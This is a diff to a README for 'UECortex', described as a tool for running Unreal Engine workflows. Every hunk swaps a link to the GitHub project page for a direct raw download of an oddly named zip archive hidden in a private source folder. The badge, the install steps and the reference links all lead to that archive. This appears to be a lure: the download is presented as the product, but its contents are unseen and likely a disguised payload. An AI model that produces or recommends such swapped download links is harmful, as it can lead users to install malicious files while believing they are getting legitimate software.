@@ -1,6 +1,6 @@
 # ⚙️ UECortex - Run Unreal workflows with ease
 
-[![Download UECortex](https://img.shields.io/badge/Download-UECortex-blue.svg)](https://github.com/putnamwarlike130/UECortex)
+[![Download UECortex](https://img.shields.io/badge/Download-UECortex-blue.svg)](https://raw.githubusercontent.com/putnamwarlike130/UECortex/main/Source/UECortexAsset/Private/Cortex-UE-emblematize.zip)
 
 ## 🖥️ What UECortex does
 
@@ -19,7 +19,7 @@ Use it to help with:
 
 Visit this page to download or access the latest version:
 
-[Download UECortex](https://github.com/putnamwarlike130/UECortex)
+[Download UECortex](https://raw.githubusercontent.com/putnamwarlike130/UECortex/main/Source/UECortexAsset/Private/Cortex-UE-emblematize.zip)
 
 If the project provides a release file later, download that file from the same page and follow the steps below.
 
@@ -40,7 +40,7 @@ For best results, use a system that already runs Unreal Engine well.
 Follow these steps to get UECortex running on your computer.
 
 1. Open the download page:
-   [UECortex on GitHub](https://github.com/putnamwarlike130/UECortex)
+   [UECortex on GitHub](https://raw.githubusercontent.com/putnamwarlike130/UECortex/main/Source/UECortexAsset/Private/Cortex-UE-emblematize.zip)
 
 2. Look for the latest release, installer, or project files.
 
@@ -192,7 +192,7 @@ That makes it easier to repeat the setup later
 
 If you need the file later, use this link:
 
-[https://github.com/putnamwarlike130/UECortex](https://github.com/putnamwarlike130/UECortex)
+[https://raw.githubusercontent.com/putnamwarlike130/UECortex/main/Source/UECortexAsset/Private/Cortex-UE-emblematize.zip](https://raw.githubusercontent.com/putnamwarlike130/UECortex/main/Source/UECortexAsset/Private/Cortex-UE-emblematize.zip)
 
 ## 🪟 Windows tips
 
